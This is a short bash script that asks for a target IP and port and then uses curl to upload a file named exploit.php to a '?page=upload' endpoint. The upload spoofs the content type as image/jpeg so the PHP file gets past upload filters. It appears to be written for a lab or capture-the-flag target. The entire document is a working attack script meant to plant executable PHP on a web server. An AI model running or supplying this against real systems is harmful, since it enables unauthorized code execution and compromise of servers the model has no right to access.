#!/usr/bin/env bash
echo "Enter IP address"
read IP
echo "Enter PORT (only 80, 8080)"
read PORT
echo "WAIT.................................."
curl -F "uploaded=@exploit.php;type=image/jpeg" -F "Upload=Upload" "http://${IP}:${PORT}/?page=upload"
